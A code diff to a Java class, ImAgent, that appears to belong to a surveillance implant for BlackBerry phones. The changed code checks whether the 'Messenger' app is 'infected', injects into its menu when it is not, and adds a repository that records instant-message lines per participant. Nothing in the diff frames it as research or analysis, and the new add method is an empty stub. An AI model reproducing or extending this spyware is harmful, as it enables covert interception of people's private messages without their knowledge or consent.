@@ -10,7 +10,10 @@
 package blackberry.agent;
 
 import net.rim.device.api.system.Backlight;
+import blackberry.AgentManager;
 import blackberry.AppListener;
+import blackberry.agent.im.ImRepository;
+import blackberry.agent.im.Line;
 import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -20,7 +23,7 @@ import blackberry.interfaces.BacklightObserver;
 import blackberry.utils.Utils;
 
 /**
- * PIM, calendario, appuntamenti.
+ * Instant Message.
  */
 public final class ImAgent extends Agent implements BacklightObserver,
         ApplicationObserver {
@@ -34,6 +37,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
     //boolean infected;
 
     String appName = "Messenger";
+    ImRepository imRepository;
 
     /**
      * Instantiates a new task agents
@@ -47,6 +51,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
         //#ifdef IM_FORCED
         enable(true);
         //#endif
+
     }
 
     /**
@@ -61,8 +66,14 @@ public final class ImAgent extends Agent implements BacklightObserver,
         this(agentStatus);
         parse(confParams);
 
+        imRepository = new ImRepository();
+        
         setPeriod(APP_TIMER_PERIOD);
         setDelay(APP_TIMER_PERIOD);
+    }
+
+    public static ImAgent getInstance() {
+        return (ImAgent) AgentManager.getInstance().getItem(Agent.AGENT_IM);
     }
 
     public synchronized void actualStart() {
@@ -81,7 +92,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
             debug.error("actualStart: " + ex);
             //#endif
         }
-        
+
     }
 
     private void menuInject() {
@@ -102,22 +113,23 @@ public final class ImAgent extends Agent implements BacklightObserver,
     }
 
     boolean infecting = false;
+
     public void actualRun() {
 
         if (appInjector.isInfected() && Backlight.isEnabled()
                 && isAppForeground) {
             //#ifdef DEBUG
             debug.info("actualRun, infected, enabled, foreground");
-          //#endif
+            //#endif
 
             //appInjector.callMenuInContext();
         }
-      //#ifdef DEBUG
-        if(! appInjector.isInfected() && !infecting){
+        //#ifdef DEBUG
+        if (!appInjector.isInfected() && !infecting) {
             infecting = true;
             menuInject();
         }
-      //#endif
+        //#endif
     }
 
     /*
@@ -164,6 +176,20 @@ public final class ImAgent extends Agent implements BacklightObserver,
             //#endif
             isAppForeground = false;
         }
+    }
+
+    public boolean has(String partecipants, Line line) {
+        if (imRepository == null) {
+            imRepository = new ImRepository();
+
+        }
+        boolean alreadySaved = imRepository.has(partecipants, line);
+        return alreadySaved;
+    }
+
+    public void add(String partecipants, Line line) {
+        // TODO Auto-generated method stub
+
     }
 
 }
